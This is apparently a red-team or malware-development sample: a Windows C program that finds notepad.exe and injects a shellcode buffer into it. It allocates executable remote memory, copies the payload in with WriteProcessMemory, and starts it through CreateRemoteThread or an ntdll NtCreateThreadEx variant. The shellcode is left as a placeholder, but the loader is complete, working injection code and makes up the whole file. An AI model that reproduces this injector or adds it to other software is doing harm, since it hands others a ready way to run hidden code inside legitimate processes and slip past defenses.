#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);
  
unsigned char payload[] = {"SHELLCODE GOES HERE"};
unsigned int payload_len = sizeof(payload);

int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
	
        //Take a snapshot of all processes in the system.        
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
	
        // Set the size of the structure before using it        
        pe32.dwSize = sizeof(PROCESSENTRY32);
	
        // Retrieve information about the first process,
  	// and exit if unsuccessful        
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
        
	// Loops through the process list and looks for maching string.
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
        
	//Returns the pid of target process.
        return pid;
}


// classic injection
int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;
  	//Creates a buffer in memory for shellcode.
	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	//Copies the shellcode into the allocated buffer space.
	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
	//Triggers the shellcode.
	hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
	if (hThread != NULL) {
			WaitForSingleObject(hThread, 500);
			CloseHandle(hThread);
			return 0;
	}
	return -1;
}


// variants of classic injection
int Inject2(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;
	CLIENT_ID cid;

	//RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
	NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateThreadEx");
	//Creates a buffer in memory for shellcode.
	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	//Copies the shellcode into the allocated buffer space.
	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
	
	//pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteCode, 0, &hThread, &cid);
	
 	//Triggers the shellcode.
	pNtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hProc, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, NULL, NULL, NULL, NULL, NULL);   //Executes the payload
	if (hThread != NULL) {
			WaitForSingleObject(hThread, 500);
			CloseHandle(hThread);
			return 0;
	}
	return -1;
}


int main(void) {
    
	int pid = 0;
    HANDLE hProc = NULL;

	pid = FindTarget("notepad.exe");

	if (pid) {
		printf("Notepad.exe PID = %d\n", pid);

		// try to open target process
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			Inject2(hProc, payload, payload_len);
			CloseHandle(hProc);
		}
	}
	return 0;
}
